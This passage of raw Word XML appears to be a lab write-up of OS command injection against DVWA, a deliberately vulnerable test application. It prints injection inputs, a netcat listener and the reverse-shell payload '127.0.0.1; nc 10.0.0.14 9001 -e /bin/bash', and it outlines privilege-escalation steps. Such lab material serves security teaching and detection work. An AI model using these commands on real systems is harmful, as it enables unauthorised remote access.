        </w:rPr>
        <w:t xml:space="preserve"> and 10.10.0.9 which our target machine that running DVWA on port 8181.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="005F4474" w:rsidRDefault="005F4474" w:rsidP="00C62B0F">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:sz w:val="72"/>
          <w:szCs w:val="72"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="009259EE" w:rsidRDefault="009259EE" w:rsidP="005F4474">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:sz w:val="72"/>
          <w:szCs w:val="72"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="005F4474" w:rsidRPr="00944C35" w:rsidRDefault="005F4474" w:rsidP="00944C35">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:color w:val="FF0000"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00944C35">
        <w:rPr>
          <w:color w:val="FF0000"/>
          <w:sz w:val="72"/>
          <w:szCs w:val="72"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>OS Command Injection</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="005F4474" w:rsidRDefault="005F4474" w:rsidP="00C62B0F">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="336F78C2" wp14:editId="56788823">
            <wp:extent cx="5362575" cy="1974215"/>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0428" cy="1977106"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="005F4474" w:rsidRDefault="005F4474" w:rsidP="005F4474">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">So now we are on the page of the command injection </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">as we can see this page make ping to some device after the user put input with </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>ip</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> address, from security perspective this page very dangerous because </w:t>
      </w:r>
      <w:r w:rsidR="00E7245A">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>it</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> making ping to any device as the attacker we can make reverse shell from this situation.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="005F4474" w:rsidRDefault="005F4474" w:rsidP="005F4474">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="00ACF845" wp14:editId="06BD17FB">
            <wp:extent cx="5486400" cy="2870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870835"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="005F4474" w:rsidRPr="001B1649" w:rsidRDefault="005F4474" w:rsidP="005F4474">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">Command: 127.0.0.1; ls </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="005F4474" w:rsidRPr="001B1649" w:rsidRDefault="005F4474" w:rsidP="005F4474">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">What’s happened here that this page want some </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>ip</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> number to ping but what happened if we put</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">; after the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>ip</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> and run </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>‘</w:t>
      </w:r>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>ls</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>’</w:t>
      </w:r>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> we can see that our command ‘ls’ is running and we can see the files directory of the target.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="005F4474" w:rsidRDefault="005F4474" w:rsidP="005F4474">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">Now we need check how from this situation how we can get reverse shell to our machine and get access. So if the command ls running we have </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>os</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> command injection let’s try now check if this machine has </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>netcat</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> and try get reverse shell with </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>netcat</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="005F4474" w:rsidRPr="001B1649" w:rsidRDefault="005F4474" w:rsidP="005F4474">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="6907AD8B" wp14:editId="66998F47">
            <wp:extent cx="5486400" cy="3652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652520"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="005F4474" w:rsidRPr="001B1649" w:rsidRDefault="00970C8A" w:rsidP="005F4474">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>Command:</w:t>
      </w:r>
      <w:r w:rsidR="005F4474" w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> 127.0.0.1; which </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="005F4474" w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>nc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w:rsidR="005F4474" w:rsidRPr="001B1649" w:rsidRDefault="005F4474" w:rsidP="005F4474">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>This time run again the command like before</w:t>
      </w:r>
      <w:r w:rsidR="009259EE">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> just this time we replace ‘ls’ with ‘which </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>nc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>’</w:t>
      </w:r>
      <w:r w:rsidR="009259EE">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="005F4474" w:rsidRDefault="009259EE" w:rsidP="00536E41">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>F</w:t>
      </w:r>
      <w:r w:rsidR="005F4474" w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>rom the picture above we can see the output from our command is /bin/</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="005F4474" w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>nc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="005F4474" w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> which means </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="005F4474" w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>netcat</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="005F4474" w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> installed on this machine now the attacker can get reverse shell let’s try that.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C90C26" w:rsidRPr="001B1649" w:rsidRDefault="00C90C26" w:rsidP="005F4474">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="06988626">
            <wp:extent cx="3432175" cy="9817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2175" cy="981710"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:noFill/>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C90C26" w:rsidRPr="001B1649" w:rsidRDefault="00C90C26" w:rsidP="00C90C26">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">Command: </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>nc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> –</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>nvlp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> 9001</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C90C26" w:rsidRPr="001B1649" w:rsidRDefault="00C90C26" w:rsidP="00C90C26">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>-l listener</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C90C26" w:rsidRPr="001B1649" w:rsidRDefault="00C90C26" w:rsidP="00C90C26">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">-p port number </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C90C26" w:rsidRPr="001B1649" w:rsidRDefault="00C90C26" w:rsidP="00C90C26">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>-v verbose</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C90C26" w:rsidRDefault="00C90C26" w:rsidP="00C90C26">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">The attacker now run </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>netcat</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> listener on his side and he waiting for incoming connection for our reverse shell.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00C90C26" w:rsidRPr="001B1649" w:rsidRDefault="00CC458C" w:rsidP="00C90C26">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="0E00E1B8" wp14:editId="52E015AD">
            <wp:extent cx="5486400" cy="2877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877820"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CC458C" w:rsidRPr="001B1649" w:rsidRDefault="00CC458C" w:rsidP="00CC458C">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">Command: 127.0.0.1; </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>nc</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> 10.0.0.14 9001 -e /bin/bash</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CC458C" w:rsidRDefault="00CC458C">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">From the picture above we are now try get reverse shell and we use </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>netcat</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> 10.0.0.14 it’s the </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>ip</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> of the attacker(Kali) the port 9001 and listener open wait on port 9001 –e /bin/bash need to give very nice </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">shell </w:t>
      </w:r>
      <w:r w:rsidR="00536E41">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>.L</w:t>
      </w:r>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>et’s</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> try send </w:t>
      </w:r>
      <w:r w:rsidR="00536E41">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>this</w:t>
      </w:r>
      <w:r w:rsidR="00536E41" w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>and see what’s happen.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CC458C" w:rsidRPr="001B1649" w:rsidRDefault="00CC458C" w:rsidP="00CC458C">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="005F4474" w:rsidRDefault="00CC458C" w:rsidP="00C62B0F">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251662336" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="566A6C24" wp14:editId="4BC3907F">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="column">
              <wp:posOffset>452120</wp:posOffset>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>72390</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="4448175" cy="155257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8175" cy="1552575"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:anchor>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="005F4474" w:rsidRDefault="005F4474" w:rsidP="00C62B0F">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="005F4474" w:rsidRDefault="005F4474" w:rsidP="00C62B0F">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">             </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="005F4474" w:rsidRDefault="005F4474" w:rsidP="00C62B0F">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="005F4474" w:rsidRDefault="00CC458C" w:rsidP="00C62B0F">
      <w:pPr>
        <w:ind w:firstLine="720"/>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="292FDB54" wp14:editId="2BFDF16B">
            <wp:extent cx="5486400" cy="2738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738755"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CC458C" w:rsidRPr="001B1649" w:rsidRDefault="00CC458C" w:rsidP="00CC458C">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>It Works! We got reverse shell back to our kali machine and from the pictures above we can see we got shell as www-data and this the low privilege user on the system now the attacker need check how he can escalate privileges. So now the attacker (10.0.0.14) get shell on the Ubuntu box (10.10.0.9). and we got shell as www-</w:t>
      </w:r>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>data the lowest privilege user on Linux systems, now we need find way to escalate our privileges.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CC458C" w:rsidRDefault="00CC458C" w:rsidP="00CC458C">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">Next step to run LinEnum.sh on the target system and see if the attacker can find useful information. now we need transfer LinEnum.sh from our kali machine to the target machine we will use for that with python server on the kali and </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>wget</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="001B1649">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> to download LinEnum.sh on the target machine let’s see how we can do that.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0073265D" w:rsidRDefault="00FA66BB" w:rsidP="0073265D">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">Before we running </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>LinEnum</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidR="00CC458C">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> let’s go back to our monitor systems and see what we can find after we run the attack OS command injection. </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="0073265D" w:rsidRDefault="0073265D" w:rsidP="0073265D">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
